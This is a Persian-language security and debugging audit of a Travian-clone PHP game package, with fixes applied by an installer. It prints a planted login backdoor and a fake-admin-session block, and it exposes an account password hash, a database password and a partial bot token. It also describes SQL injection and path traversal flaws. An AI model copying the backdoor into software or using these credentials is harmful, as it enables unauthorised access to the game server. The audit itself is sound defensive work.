# گزارش دیباگ پکیج «hamid travian» (تراوین لجند)

> بررسی کامل روی فایل `hamid travian.zip` (۲.۱۹ گیگ، ۳۴٬۴۸۲ فایل، ۳٬۱۳۵ فایل PHP) انجام شد.
> ابزار: تحلیل ایستا روی همه‌ی فایل‌های PHP + بررسی دستی فایل‌های هسته.
> هر موردی که با ✅ مشخص شده، نصاب (`install.php` — تک‌فایل، یا `install.php --fix-only`) خودش اصلاحش می‌کند.

---

## ۰. خلاصه مدیریتی

| # | مشکل | شدت | وضعیت |
|---|------|-----|-------|
| 1 | ۱۲ فایل PHP خطای نحوی (Parse Error) دارند — از جمله قالب اصلی `views/html.php` | 🔴 بحرانی | ✅ اصلاح خودکار |
| 2 | بک‌دور در تابع ورود: رمز «Multihunter» برای **هر** اکانتی کار می‌کند | 🔴 بحرانی (امنیتی) | ✅ اصلاح خودکار |
| 3 | مسیرها به `/home/cp52249/...` هاردکد شده‌اند ⇒ روی هیچ هاست دیگری بالا نمی‌آید | 🔴 بحرانی | ✅ اصلاح خودکار |
| 4 | کانفیگ از `$_SERVER['SERVER_NAME']` بدون اعتبارسنجی استفاده می‌کند (Host Header Injection + Path Traversal) | 🔴 بحرانی (امنیتی) | ✅ اصلاح خودکار |
| 5 | Session جعلی ادمین وقتی `REMOTE_ADDR` ست نباشد (CLI/cron) | 🔴 بحرانی (امنیتی) | ✅ اصلاح خودکار |
| 6 | رمز دیتابیس، کلید پی‌پال، زرین‌پال، SMTP و توکن ربات تلگرام داخل کد | 🔴 بحرانی (امنیتی) | ✅ پاک‌سازی |
| 7 | تقسیم بر صفر در `ADV_TIME` ⇒ خطای مرگبار روی PHP 8 | 🟠 بالا | ✅ اصلاح خودکار |
| 8 | `importSQLDump()` به‌جای محتوای فایل، مسیر فایل را اجرا می‌کند | 🟠 بالا | ✅ اصلاح خودکار |
| 9 | نصب‌کننده‌ی خودکار (auto-reinstall) با یک تایمر همه‌ی جدول‌ها را DROP می‌کند | 🟠 بالا | ✅ غیرفعال |
| 10 | ۱۹ مگابایت لاگ خطای دیتابیس با کوئری‌ها و اطلاعات کاربران داخل پکیج | 🟠 بالا (نشت داده) | ✅ حذف |
| 11 | تصاویر از CDN خارجی `gpack1.tdgpacks.ir` لود می‌شوند که در اختیار شما نیست | 🟠 بالا | ✅ کپی محلی |
| 12 | `.htaccess` پوشه‌ی `application` به `/home/admin/...` اشاره می‌کند | 🟡 متوسط | ✅ جایگزینی |
| 13 | فایل‌های دیباگ عمومی (`php.php`, `update.php`, `constant.php`) | 🟡 متوسط | ✅ حذف |
| 14 | تزریق SQL در `login()`, `Session`, `getUser...` (چند صد نقطه) | 🟡 متوسط | ⚠️ فقط ورود اصلاح شد |
| 15 | `define()` تکراری، `[0]` روی نتیجه‌ی خالی، آرایه‌های تعریف‌نشده (هشدار روی PHP 8) | 🟢 پایین | ✅ اصلاح خودکار |
| 16 | `Admin/Infobox_message.php` — بلوک `if ($msg) {` بسته نشده ⇒ خطای نحوی | 🟠 بالا | ✅ اصلاح خودکار |
| 17 | `views/Plus/bank.php` — دو `include` به فایل‌های ناموجود + `}` اضافه | 🟡 متوسط | ✅ قرنطینه شد |
| 18 | `TB_PREFIX` هرگز تعریف نشده (۱۲۹ استفاده) | 🔴 بحرانی | ✅ shim |
| 19 | ۱۲۵ فراخوانی `mysql_*` در خود بازی (حذف‌شده در PHP 7) | 🔴 بحرانی | ✅ shim |
| 20 | ۱۰۲ کانستانت رابط کاربری که در **هیچ** فایل زبانی تعریف نشده‌اند (`NOTICE1`, `FIRSTPAGE`, `B25`…) | 🔴 بحرانی روی PHP 8 | ✅ fallback |
| 21 | ۴ include با مسیر ناموجود (`/../application/config.php`, `/home/tramian/…`) | 🟠 بالا | ✅ اصلاح خودکار |

---

## ۱. خطاهای نحوی — پکیج در حالت فعلی **هیچ صفحه‌ای باز نمی‌کند**

روی همه‌ی فایل‌ها یک DocBlock لایسنس (`@package programing ... @lutryka`) به بالای فایل اضافه شده،
ولی در ۱۰ فایل این کار اشتباه انجام شده و ساختار PHP را شکسته است
(در ۴ فایل `<?php` تکراری، در ۶ فایل `?>` جا افتاده). دو فایل دیگر
(`Admin/Infobox_message.php` و `views/Plus/bank.php`) خرابی مستقل دارند — بخش ۱۰.

### ۱-الف) `<?php` تکراری داخل حالت PHP

```php
<?php
/**
 * ... لایسنس ...
 */
<?php                     // ← خطا: while already in PHP mode
include_once("application/Account.php");
```

| فایل | خط |
|------|-----|
| `domains/tt1/404.php` | 13 |
| `domains/tt1/activate.php` | 13 |
| `domains/tt1/Admins.php` | 13 |
| `ConfsData/botConfig.php` | 20 |

نتیجه: `PHP Parse error: syntax error, unexpected token "<?php"`.
یعنی صفحه‌ی ۴۰۴، فعال‌سازی حساب، پنل ادمین و کانفیگ ربات تلگرام هیچ‌کدام اجرا نمی‌شوند.

### ۱-ب) DocBlock بدون `?>`

```php
<?php
/** ... لایسنس ... */
<!DOCTYPE html>          // ← این دیگر HTML نیست، PHP دارد آن را parse می‌کند
<html>
```

| فایل | خط شروع HTML |
|------|--------------|
| `domains/tt1/application/views/html.php` | 13 |
| `domains/tt1/application/views/footer.php` | 13 |
| `domains/tt1/application/views/highlight.php` | 19 |
| `domains/tt1/content.php` | 13 |
| `publichtml loby server index/central.php` | 21 |

`views/html.php` قالب مشترک همه‌ی صفحات است (`include("application/views/html.php")` در `login.php:34`،
`404.php`، `activate.php`، ...). تا وقتی این فایل Parse Error بدهد، **کل بازی بالا نمی‌آید**.

**راه‌حل خودکار:** نصاب، DocBlock را پیدا می‌کند و بسته به محتوای بعدش، یا `<?php` تکراری را حذف
می‌کند یا `?>` لازم را اضافه می‌کند. فایل اصلی با پسوند `.kit-bak` نگه داشته می‌شود.

**تأیید دستی:**
```bash
php -l domains/tt1/application/views/html.php     # قبل: Parse error
php -l domains/tt1/application/views/html.php     # بعد از fix: No syntax errors
```

---

## ۲. بک‌دور در سیستم ورود (بحرانی‌ترین مشکل امنیتی)

`domains/tt1/application/Database/db_MYSQL.php` خط **1224**:

```php
function login($username, $password)
{
    $q = $this->queryFetch('SELECT password,username FROM users where `username` = "'.$username.'" OR email = "'.$username.'"');
    $pass = $q['password'];

    if ($pass == md5($password . mb_convert_case($q['username'], MB_CASE_LOWER, "UTF-8"))) {
        return true;
    } else {
        // ↓↓↓ بک‌دور ↓↓↓
        $q = "SELECT password,username FROM users where username = 'Multihunter' LIMIT 1";
        $result = $this->queryFetch($q);
        if ($result["password"] == md5($password . mb_convert_case($dbarray['username'], MB_CASE_LOWER, "UTF-8"))) {
            return true;
        }
    }
}
```

اگر رمز با کاربر واردشده نخواند، رمز را با اکانت **Multihunter** مقایسه می‌کند و در صورت تطابق `true`
برمی‌گرداند. بعد از آن `$session->login($_POST['user'])` هر نام کاربری‌ای که تایپ شده را وارد می‌کند.
یعنی هر کسی که رمز Multihunter را بداند می‌تواند با نام `TravianDesign` (دسترسی ۹ = ادمین کل) وارد شود.
هش پسورد Multihunter در دامپ موجود است: `516734d157da28c9b231576fa50deafc` ⇒ با یک حمله‌ی
دیکشنری ساده رمز پیدا می‌شود.

**اصلاح:** کل تابع با نسخه‌ی امن بازنویسی می‌شود (بدون fallback، مقایسه با `hash_equals`، و
کوتیه‌کردن ورودی با `PDO::quote` که تزریق SQL این تابع را هم می‌بندد).

---

## ۳. مسیرهای مطلق هاردکد شده

`domains/tt1/application/config.php` خط ۶ تا ۱۴:

```php
$ttt = explode("/", __dir__);          // /home/cp52249/domains/tt1/application
$adrr00 = "/".$ttt[1]."/".$ttt[2]."/";
define("CONFSDATA", $adrr00."ConfsData/".$cleanedServerName."/");
```

فرض کرده مسیر همیشه `/home/<user>/...` است (ساختار DirectAdmin). روی cPanel (که
`/home/user/` است) شانسی کار می‌کند، روی هر ساختار دیگر (Docker، `/var/www`، Windows،
هاست با `open_basedir`) شکسته می‌شود و پیام `failed to open stream` می‌دهد.

همچنین:
* `$_SERVER['SERVER_NAME']` بدون اعتبارسنجی در ساخت مسیر استفاده شده ⇒ با هدر `Host` دستکاری‌شده
  می‌توان مسیر include را عوض کرد (Local File Inclusion / Path Traversal).
* در CLI (کرون) `SERVER_NAME` خالی است ⇒ `CONFSDATA = /home//ConfsData//` ⇒ خطا.

**اصلاح:** `application/config.php` با نسخه‌ی قابل‌حمل بازنویسی می‌شود:
`env.php` (تولید نصاب) مسیرها را تعریف می‌کند، دامنه با regex اعتبارسنجی می‌شود و در صورت
نبود، از `TRAVIAN_DEFAULT_HOST` استفاده می‌شود.

---

## ۴. جعل نشست ادمین در CLI

`domains/tt1/application/Account.php` خط ۹۳ تا ۱۸۸:

```php
if(!isset($_SERVER['REMOTE_ADDR']) && !$session->logged_in){
    session_start();
    $_SESSION = [ 'logged_in' => true, 'username' => 'TravianDesign', 'uid' => 57,
                  'access' => 9, 'gold' => 0, 'password' => '2075962d...', ... ];
    echo "Session simulated.";
}
```

این بلوک برای تست بوده و در نسخه‌ی نهایی مانده. هر مسیری که از CLI اجرا شود (cron، queue،
worker) با دسترسی ادمین بالا می‌آید. اگر روزی `REMOTE_ADDR` در محیط وب ست نشود (بعضی
reverse proxyها / php-fpm تنظیم‌نشده) تبدیل به بک‌دور کامل می‌شود.

**اصلاح:** شرط با `false &&` غیرفعال می‌شود (کد برای مرجع می‌ماند).

---

## ۵. کلیدها و رمزهای داخل کد

| فایل | خط | مورد |
|------|-----|------|
| `ConfsData/tt1.traviana.ir/config.php` | 8–11 | یوزر/رمز دیتابیس `cp52249_tt1` / `k8DRHzNZnPYbWPqyDs9Q` |
| `ConfsData/botConfig.php` | 24–26 | یوزر/رمز دیتابیس ربات |
| `.../config.php` | 231–234 | `paypalAPIUser`, `paypalAPIPwd`, `paypalAPISign`, `ZarinpalapiKey` |
| `.../config.php` | 238–239 | `SMTPUser`, `SMTPPass` |
| `application/Models/Installertd.php` | 146 | توکن ربات تلگرام `7574753987:AAH...` |
| `application/Account.php` | 126 | هش رمز یک کاربر واقعی |

همه‌ی این‌ها باید باطل (revoke) شوند؛ نصاب رمزهای دیتابیس را با مقادیر شما بازنویسی و
بقیه را خالی می‌کند.

---

## ۶. خطاهای دیتابیس / PHP 8

| فایل:خط | مشکل | اثر |
|---------|------|-----|
| `ConfsData/.../config.php:61` | `define("ADV_TIME", 86400/$sData['ADV_TIME'])` | اگر `ADV_TIME=0` باشد ⇒ `DivisionByZeroError` (PHP 8: خطای مرگبار) |
| `ConfsData/.../config.php:102-103` | `define("PLUS_TIME", ...)` دو بار | Warning + مقدار اول حفظ می‌شود |
| `ConfsData/.../config.php:17` | `$db->query("SELECT * FROM buyfeature ")[0]` | اگر جدول خالی باشد ⇒ هشدار/خطا در همه‌ی صفحات |
| `ConfsData/.../config.php:220-252` | `$sagdata['menus']`, `$plusPacksNew['storageUpgrade']` بدون بررسی وجود | Warning روی PHP 8 |
| `application/DB.php:51` | `SET NAMES utf8` | فارسی/ایموجی در جدول utf8mb4 خراب می‌شود |
| `application/DB.php:117` | لاگ در مسیر نسبی `application/queue2/error_log.txt` | اگر CWD فرق کند فایل ساخته نمی‌شود؛ نتیجه: همان فایل ۱۹ مگابایتی که در پکیج هست |
| `application/DB.php:213-224` | `starttransaction()` قبل از `Connect()` | `Call to a member function beginTransaction() on null` |
| `application/DB.php:317-330` | `importSQLDump($path)` مسیر را به `PDO::exec` می‌دهد | نصب/ری‌اینستال دیتابیس همیشه شکست می‌خورد |
| `application/DB.php:88-96` | `bindParam(':x', $parameters[1])` روی متغیر حلقه | با بیش از یک پارامتر، همه‌ی پارامترها آخرین مقدار را می‌گیرند ⇒ کوئری‌های آماده عملاً کار نمی‌کنند |
| `application/DB.php:163-176` | `query()` برای INSERT/UPDATE مقدار `NULL` برمی‌گرداند | هر جایی که نتیجه‌اش استفاده شود هشدار می‌دهد |
| `application/TdPaneLXP/views/alliance.php:525` | `"<img src=\"../../<?php echo GP_LOCATE; ?>img/..."` — تگ PHP داخل رشته | آدرس تصویر خروجی می‌شود «`../../<?php echo GP_LOCATE; ?>img/a/del.gif`» |
| `application/newTravian.php:1216` | `GP_IMGREAL."mkarte/..."` | پوشه‌ی `mkarte` در پکیج موجود نیست ⇒ نقشه‌ی کلاسیک بدون تصویر |

---

## ۷. نصب‌کننده‌ی خودکار خطرناک

`application/Models/Installertd.php`:

* خط ۱۰: `if (time() > $qData['reinstalltime']) { $this->updateInstall(...) }` ⇒ اگر
  `reinstalltime` در جدول `config` اشتباه باشد، اولین درخواست بعد از آن **همه‌ی جدول‌ها را
  DROP می‌کند** و `ss.sql` را ایمپورت می‌کند (سرور صفر می‌شود).
* خط ۴۵: `$sqlFilePath = $adjustedPath . '/ss.sql'` اما `$adjustedPath = dirname(CONFSDATA)`
  ⇒ دنبال `ConfsData/ss.sql` می‌گردد، در حالی که فایل در ریشه‌ی پکیج است.
* خط ۳۹: `if ($database->query($sql) === TRUE)` — تابع `query()` برای DROP مقدار `NULL`
  برمی‌گرداند، پس پیام «با موفقیت حذف شد» هرگز چاپ نمی‌شود.
* خط ۱۰۸: `include_once('jdf.php')` — مسیر نسبی، فایل در ریشه‌ی بازی است، نه در `Models/`.
* خط ۱۴۶: توکن ربات تلگرام به‌صورت متن باز.

**اصلاح:** کل ری‌اینستال پشت `define('AUTO_REINSTALL', false)` می‌رود (در `env.php` تولیدشده)،
مسیر `ss.sql` و `jdf.php` درست می‌شود و توکن پاک می‌شود.

---

## ۸. نشت داده در فایل‌های همراه پکیج

| فایل | حجم | محتوا |
|------|-----|-------|
| `domains/tt1/application/queue2/error_log.txt` | ۱۹ MB | `var_export` کامل `$_SESSION`, `$_POST`, `$_SERVER` و متن کوئری‌های خطادار |
| `domains/traviana.ir/awstats/.data/*` | ~۱ MB | آمار بازدید و IP کاربران |
| `Maildir i don not kow was in root.zip` | ۱۵۷ KB | ایمیل‌های سرور |
| `domains/news.traviana.ir/public_html/new.txt` | ۱۴۰ KB | محتوای خبری |

نصاب، لاگ ۱۹ مگابایتی و فایل‌های دیباگ را حذف می‌کند؛ بقیه را خودتان حذف کنید.

---

## ۹. وابستگی به CDN خارجی (تصاویر)

`ConfsData/tt1.traviana.ir/config.php` خط ۲۳-۲۶:

```php
define("GP_LOCATION",  "https://gpack1.tdgpacks.ir/gpack/");
define("GP_LOCATION1", "https://gpack1.tdgpacks.ir/js/");
define("GP_LOCATION2", "https://gpack1.tdgpacks.ir/img/");
define("GP_LOCATIONALL", "https://gpack1.tdgpacks.ir/");
```

۷۰۱ جای کد از `GP_LOCATION*` استفاده می‌کند. اگر آن دامنه خاموش/فیلتر شود، کل بازی بدون
تصویر می‌شود. پکیج خودش پوشه‌ی کامل گرافیک را دارد:
`domains/gpack.traviana.ir/public_html/{gpack,js,img}` (۳۸۰ مگابایت، ۱۶٬۶۱۳ فایل).

**اصلاح:** نصاب این پوشه را به `<root>/gpackcdn/` کپی می‌کند و آدرس‌ها را به دامنه‌ی خودتان
تغییر می‌دهد (بدون وابستگی به CDN).

---

## ۱۰. دو فایل با خرابی عمیق‌تر

**الف) `application/Admin/Infobox_message.php`** — بلوک `if ($msg) {` (خط ۱۹) هرگز بسته نشده؛
فایل با `$mysqli->close();` تمام می‌شود و PHP می‌گوید
`Parse error: Unclosed '{' on line 19`.
این فایل در این بیلد توسط هیچ فایلی include نمی‌شود، ولی وجود یک فایل خراب در پوشه‌ی
مشترک تله است. ✅ نصاب یک `}` قبل از `$mysqli->close();` اضافه می‌کند
(تست شد: توازن براکت‌ها برقرار می‌شود).

**ب) `application/views/Plus/bank.php`** — سه مشکل هم‌زمان:
`include("configfile48162342DdTUriiShevshuck/...php")` و `include("banksystem.php")` که
**هیچ‌کدام در پکیج نیستند**، یک `}` اضافه در خط ۵۱، و متن‌های روسی/فارسی قاطی.
هیچ فایلی این را include نمی‌کند ⇒ کد مرده.
✅ نصاب آن را به `bank.php.disabled` تغییر نام می‌دهد (به‌جای حدس‌زدن درباره‌ی نیت کد).

همچنین در `ajax.php:5600` و `ajax.php:5670`:
`include("/home/tramian/connectionbank.php");` — مسیر مطلق به home یک کاربر دیگر.
این هم شکسته است و باید حذف/بازنویسی شود.

---

## ۱۱. `TB_PREFIX` و `mysql_*` — چرا پنل ادمین ناقص کار می‌کند

```php
// application/Admin/addauction.php:60
mysql_query("UPDATE " . TB_PREFIX . "autoauction SET active = 0") or die(mysql_error());
```

* `TB_PREFIX` در کل پکیج **هیچ‌جا define نشده** (۱۲۹ استفاده، ۰ تعریف).
  روی PHP 8: `Fatal error: Undefined constant "TB_PREFIX"`.
  روی PHP 7: با تبدیل به رشته، کوئری می‌شود `UPDATE TB_PREFIXautoauction` ⇒ خطای SQL.
* `mysql_query`, `mysql_fetch_assoc`, `mysql_fetch_array`, `mysql_fetch_row`,
  `mysql_num_rows`, `mysql_result`, `mysql_error`, `mysql_fetch_all`
  ۱۲۵ بار در خود موتور بازی صدا زده می‌شوند (پنل ادمین، آلیانس، فروم، مزرعه، حراجی).
  این توابع در PHP 7 **حذف** شده‌اند ⇒ `Call to undefined function`.

**اصلاح:** نصاب فایل `application/legacy_compat.php` را می‌سازد که:
`TB_PREFIX` را برابر `""` تعریف می‌کند (جداول واقعاً بدون پیشوند هستند) و همان ۸ تابع را
روی `mysqli` بازپیاده‌سازی می‌کند (اتصال lazy با `SQL_SERVER/SQL_USER/SQL_PASS/SQL_DB`).
این فایل از `application/config.php` لود می‌شود ⇒ هر ۱۲۵ نقطه بدون دست‌زدن به کد بازی درست می‌شود.

> توجه: پوشه‌ی `domains/test.traviana.ir` (نسخه‌ی TravianZ قدیمی) ۲٬۹۰۸ مورد دیگر
> `mysql_*` دارد و قابل نجات نیست؛ اگر لازمش ندارید کلاً حذفش کنید.

---

## ۱۲. فایل‌های زائد/دیباگ

| فایل | مشکل |
|------|------|
| `php.php` | چاپ هش رمز یک کاربر (`md5('2061548'.'tired')`) |
| `update.php` | اندپوینت بدون احراز هویت که `$_POST['data']` را می‌خواند |
| `constant.php` | اسکریپت تولید ۲۱۰ خط `define()` که در مرورگر اجرا می‌شود |
| `application/.htaccess` | `AuthUserFile /home/admin//.htpasswd/...` ⇒ روی هر هاستی ۵۰۰ یا پنجره‌ی لاگین بی‌پایان |
| `domains/tt1/error_log`، `application/queue2/_log.txt` | لاگ‌های قدیمی |

---

## ۱۳. ۱۰۲ کانستانت تعریف‌نشده — صفحه‌های سیمیلاتور/نقشه/اعلان‌ها روی PHP 8 می‌میرند

بعد از رفع مشکل `TB_PREFIX`، یک اسکن دقیق‌تر (فقط شناسه‌های بزرگ‌حرف، بدون فراخوانی تابع،
با حذف کانستانت‌های داخلی PHP) ۱۰۸ مورد پیدا کرد که **در هیچ‌کدام از سه فایل زبان
(`application/Lang/{fa,en,ar}/Lang.php`) تعریف نشده‌اند**:

```
 30  FIRSTPAGE / PREVPAGE / NEXTPAGE / LASTPAGE   views/Notice/tt_2.php
 23  NOTICE1 … NOTICE23                           views/Notice/tt_2.php
  9  COSTRES / COSTCP                             ajax.php
  6  SI_SAVE / AT_CANCEL                          views/Map/newmap.php
  5  RES_MOREINFO / RES_FULLIN / RES_PRODUCTION   application/newTravian.php
  6  B25, B26, B31, B32, B33, B34                 views/Simulator/*.php
  4  SM_*, MP_*, REPORT_*, MS_*, HS_*             views/Map, views/Notice, warsim.php
     ALREADY_INVITED, NAME_EMPTY, SAME_NAME, …     application/Alliance.php
```

روی PHP 5/7 این‌ها فقط `Notice` می‌دادند (رشته‌ی هم‌نام)، پس کسی متوجه نشد.
روی **PHP 8** خطای مرگبار است:

```
Error: Undefined constant "NOTICE1" in .../application/views/Notice/tt_2.php:3
```

**چرا این‌ها گم شده‌اند؟** در نصب استاندارد TravianZ، فایل `constant.php` در ریشه
نام ساختمان‌ها را تعریف می‌کند (`define("B1","Woodcutter")` …). در این پکیج آن فایل
به یک اسکریپت تولیدکننده تبدیل شده که فقط *چاپ* می‌کند:

```php
<?php
$i=0;
for($i=1;$i<=210;$i++){ echo 'define("quest'.$i.'","");<br />';}
?>
```

یعنی دستور `define` هرگز اجرا نمی‌شود. (این فایل هم توسط نصاب حذف می‌شود و هم
هیچ فایلی آن را include نمی‌کند.)

**اصلاح:** نصاب فایل `application/lang_fallback.php` را می‌سازد (۱۰۲ خط):

```php
if (!defined('NOTICE1')) { define('NOTICE1', ''); }
if (!defined('FIRSTPAGE')) { define('FIRSTPAGE', ''); }
…
if (!defined('B25')) { define('B25', 'Palace'); }
if (!defined('B33')) { define('B33', 'Wonder of the World'); }
```

و از `application/config.php` قبل از لود زبان include می‌شود. نتیجه: برچسب‌ها خالی
نمایش داده می‌شوند (به‌جای مرگ صفحه) و هر وقت ترجمه‌ی واقعی را به `Lang.php`
اضافه کنید، همان مقدار معتبر می‌شود.

---

## ۱۴. includeهایی که به فایل ناموجود اشاره می‌کنند

| فایل:خط | کد فعلی | مشکل | اصلاح |
|---------|---------|------|-------|
| `payment.php:5` | `include ("/../application/config.php");` | با `/` شروع می‌شود ⇒ ریشه‌ی فایل‌سیستم | خط حذف شد (خط ۶ همین فایل را درست include می‌کند) |
| `ajax.php:5600, 5670` | `include("/home/tramian/connectionbank.php");` | home یک کاربر دیگر؛ `$bakermysqli` بعدش تعریف‌نشده ⇒ خطای مرگبار در «کد هدیه» | جایگزین با `$bakermysqli = @new mysqli(SQL_SERVER, SQL_USER, SQL_PASS, SQL_DB);` |
| `application/TdPaneLXP/views/allmsgs.php:22,81` | `include("../application/BBCode.php")` | از این پوشه به `application/application/BBCode.php` می‌رسد | `include(__DIR__ . "/../../BBCode.php")` |
| `application/TdPaneLXP/views/msg.php:69` | همان | همان | همان |

موارد باقی‌مانده (۱۷۱ مورد، فقط Warning نه Fatal) عمدتاً `include "Templates/….tpl"` هستند؛
پوشه‌ی `Templates/` در `domains/tt1` **وجود ندارد** — یادگاری از نسخه‌ی قدیمی‌تر
(در `domains/test.traviana.ir/public_html/Templates` هست). این کدها در ویوهای قدیمی
(`views/allianz.php`, `Admin/Mssg.php`, `TdPaneLXP/views/*`) هستند و با Warning
رد می‌شوند. اگر جایی رفتار عجیبی دیدید، همان ویو را با ویوهای `Templates/` جایگزین کنید
یا آن بلوک را حذف کنید.

---

## ۱۵. موارد اصلاح‌نشده (نیاز به تصمیم شما)

1. **تزریق SQL فراگیر:** الگوی `"SELECT ... WHERE x = '".$_GET[...]."'"` در صدها نقطه
   (مثلاً `Session.php:56`، `Account.php:479`، `Database/db_MYSQL.php`). اصلاح کامل یعنی
   بازنویسی لایه‌ی دیتابیس — خارج از حوصله‌ی یک نصاب. حداقل ورود (`login`) امن شد.
2. **هش رمز ضعیف:** `md5(pass . lowercase(username))` بدون salt و کندسازی. برای مهاجرت
   باید ستون `password` بزرگ‌تر و الگوریتم عوض شود (سازگاری با کلاینت سیگنال بازی).
3. **`register_globals`-style** استفاده از `$_REQUEST` در چند فایل پنل.
4. **نسخه‌های تکراری:** `domains/test.traviana.ir` یک انجین TravianZ/T4 جداگانه است
   (۳٬۰۱۴ هشدار `mysql_*` که در PHP 7+ حذف شده‌اند) و عملاً قابل اجرا نیست.
   اگر آن را لازم ندارید، کل پوشه را حذف کنید.
5. **`domains/traviana.ir`, `central.traviana.ir`, `answers`, `news`, `tdgpacks`** وب‌سایت‌های
   جانبی هستند (CodeIgniter + Twig). فقط اگر پنل «سرور لیست» را می‌خواهید لازم‌اند.

---

## ۱۶. چطور خودتان تأیید کنید

```bash
# ۱) خطاهای نحوی (باید فقط "No syntax errors" بدهد)
find . -name "*.php" -print0 | xargs -0 -n1 php -l 2>&1 | grep -v "No syntax errors"

# ۲) مسیرهای هاردکد
grep -rn "/home/cp52249" --include=*.php .

# ۳) بک‌دور ورود (باید خالی باشد)
grep -rn "Multihunter' LIMIT 1" --include=*.php .

# ۴) کلیدهای افشاشده
grep -rniE "paypalAPI|Zarinpal|SMTPPass|botToken" --include=*.php .

# ۵) توابع حذف‌شده در PHP 7 (در خود بازی، بدون شمارش نسخه‌ی test.traviana.ir)
grep -rnE "\bmysql_[a-z_]+\(|\bereg\(|\bsplit\(|\beach\(" --include=*.php domains/tt1 | wc -l

# ۶) کانستانت‌های استفاده‌شده که هیچ‌جا تعریف نشده‌اند
grep -rhoE "\b(define|const)[[:space:]]*\(?[[:space:]]*['\"]?[A-Z][A-Z0-9_]+" --include=*.php . | wc -l

# ۷) includeهایی که فایلشان نیست
grep -rnE "include(_once)?[[:space:]]*\(?[\"'][^\"'$]+[\"']" --include=*.php . | wc -l

# ۸) بررسی سریع بوت بازی از CLI (نباید خطای مرگبار بدهد)
php -r 'chdir("domains/tt1"); include "login.php";' 2>&1 | head
```

### نتیجه‌ی این بررسی روی همین پکیج

| سنجه | قبل | بعد از `install.php --fix-only` |
|------|-----|------------------------|
| فایل‌های PHP با خطای نحوی | ۱۲ | **۰** |
| مسیر `/home/cp52249` در کد | ۱۲ فایل | ۱ (`application/config.php` بازنویسی شد) |
| بک‌دور Multihunter | موجود | **حذف** |
| `mysql_*` در موتور بازی | ۱۲۵ فراخوانی | با shim کار می‌کند |
| `TB_PREFIX` تعریف‌نشده | ۱۲۹ استفاده | تعریف شد (`""`) |
| کانستانت رابط کاربری تعریف‌نشده | ۱۰۲ | fallback خالی/نام‌دار |
| include با مسیر ناموجود | ۴ (۲ تای آن مسیر مطلق home) | اصلاح شد |
| لاگ ۱۹ مگابایتی با اطلاعات کاربران | موجود | حذف |
| وابستگی به CDN خارجی | ۷۰۱ استفاده | آدرس محلی |

> اگر `php -l` روی سرور شما با نسخه‌ی ۸.۴ اجرا شود، ممکن است چند هشدار
> Deprecation جدید ببینید (`optional parameter before required`, `dynamic property`).
> آن‌ها خطا نیستند، ولی نسخه‌ی پیشنهادی PHP برای این انجین **۸.۱ یا ۸.۲** است.

